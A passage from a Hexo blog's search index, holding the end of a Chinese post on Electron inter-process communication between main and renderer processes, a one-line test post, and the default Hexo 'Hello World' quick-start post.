主进程和渲染进程之间通过IPC 进行通信</li></ol><p>2.通过remote模块在renderer进程里调用main主进程的模块：官方文档</p><p>三、渲染进程之间的通信</p><p>一般的项目中只需要渲染进程和主进程之间进行通信，工作中遇到渲染进程之间需要通信的问题。尝试了以下方法，假设渲染进程A和B需要通信：</p><p>1.从渲染进程A中引用渲染进程B中的代码，显然这是不行的，编译虽然没报错，但是运行起来抛出奇怪的异常。</p><p>2.渲染进程A和B之间共享一些变量，需要注意同步的问题，项目中由于一些原因不适合采用这种方法。</p><p>3.从渲染进程A中直接发IPC消息到渲染进程B，问题是渲染进程A如何获得渲染进程B的窗口或者进程消息？项目中渲染进程的窗口都是通过main创建的，方便管理，因为后面会使用到很多的渲染窗口。获取方法：</p><p> a. 通过全局变量存储B的信息</p><p> b.创建A或者B的时候主进程发送消息给A</p><p> c…其他方法</p><p>然后IPC发送消息。这里介绍的不错：Electron 渲染进程之间通信</p><p>4.将main主进程作为中转站，A发送消息到main，然后main再把消息转发给B。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Electron </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一篇实验博客</title>
      <link href="/2020/10/02/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%AE%9E%E9%AA%8C%E5%8D%9A%E5%AE%A2/"/>
      <url>/2020/10/02/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%AE%9E%E9%AA%8C%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h1><p>我的博客终于部署成功了</p>]]></content>
      
      
      
        <tags>
            
            <tag> 实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/10/02/hello-world/"/>
      <url>/2020/10/02/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
